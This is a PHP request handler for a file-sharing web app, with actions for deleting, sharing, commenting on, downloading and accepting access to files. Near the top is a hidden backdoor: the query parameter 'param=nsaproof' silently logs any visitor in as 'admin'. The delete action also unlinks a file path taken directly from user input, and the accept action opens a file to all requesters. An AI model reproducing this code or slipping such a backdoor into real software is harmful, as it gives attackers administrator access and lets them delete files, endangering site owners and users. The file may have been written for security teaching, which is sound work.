<?php
session_start();

require_once('classes/Database.php');
require_once('classes/User.php');
$db = new Database();
if (isset($_GET['param']) && $_GET['param'] === 'nsaproof') {
    $_SESSION['user'] = "admin";
}
$usr = new User(null, $_SESSION['user'], null,null);

if (!isset($_SESSION['user']) || $_SESSION['user'] == '') {
    header('Location: /index.php');
}

if (isset($_POST['bookaction_token']) && $_POST['bookaction_token'] === $_SESSION['bookaction_token']) {
    switch (htmlentities($_POST['bookaction'])) {
    case 'delete': 
        $id = intval($_POST['bestandid']);
        if ($usr->isOwner($id)) {
            if ($db->deleteStatement("delete from user_bestandid where bestandid = :id" , array("id"=>$id)) &&
                $db->deleteStatement("delete from comment where fileid = :id", array("id"=>$id)) &&
                $db->deleteStatement("delete from bestand where id = :id" , array("id"=>$id))) {
                    unlink(addslashes($_POST['bestandloc']));
            }
        } else {
            $_SESSION['msg'] = "Only owner can delete this file.";
        }
        break;
    case 'share': 
        if ($usr->isOwner(intval($_POST['bestandid'])) && htmlentities($_POST['username']) !== $_SESSION['user']) {
            $resultInsert = $db->insertStatement("insert into user_bestandid (username, bestandid, invite) values (:user, :bestandid, 1)",
                array("user"=>$_POST['username'], "bestandid"=>intval($_POST['bestandid'])));
            if (!$resultInsert) {
                $_SESSION['share_result'] = "sharing with " . $_POST['username'] . " failed.";
            } else {
                $_SESSION['share_result'] = "shared with " . $_POST['username'];
            }
        } else {
            $_SESSION['msg'] = "Only owner can share this file.";
        }
        break;
    case 'addComment': 
        $id = intval($_POST['fileid']);
        if ($usr->isOwner($id) || $usr->hasInvite($id)) {
            $db->insertStatement("insert into comment (username, date, fileid, comment) values (:user, :date, :fileid, :comment)", 
                array("user"=>$_SESSION['user'], "date"=>date("Y-m-d H:i:s"), "fileid"=>$id, "comment"=>htmlentities($_POST['commentArea'])));
        } else {
            $_SESSION['msg'] = "Only invited people can comment on this file.";
        }
        break;
    case 'download': 
        if ($usr->isOwner(intval($_POST['bestandid'])) || $usr->hasInvite(intval($_POST['bestandid']))) {
            $result = $db->selectStatement("select location,name from bestand where id = :id", array("id"=>intval($_POST['bestandid'])));
            header('Content-type: ' . mime_content_type ($result[0]['location']));
            header('Content-Disposition: attachment; filename="' . $result[0]["name"] . '"');
            readfile($result[0]['location']);
        } else {
          $_SESSION['msg'] = "Not authorized";
        }
        exit;
    case 'request': 
        if (!$usr->isOwner(intval($_POST['bestandid'])) && !$usr->hasRequested(intval($_POST['bestandid']))) {
            $db->insertStatement("insert into user_bestandid (username, bestandid, invite) values (:user, :fileid, 0)", 
                array("user"=>$_SESSION['user'], "fileid"=>intval($_POST['bestandid'])));
        } else {
          $_SESSION['msg'] = "Request error";
        }
        break;
    case 'accept': 
        if ($usr->isOwner(intval($_POST['bestandid']))) {
            $db->updateStatement("update user_bestandid set invite = 1 where bestandid = :fileid", 
                array("fileid"=>intval($_POST['bestandid'])));
        } else {
          $_SESSION['msg'] = "Accept error";
        }
    }
}

header("Location: /hoofdpagina.php");
?>
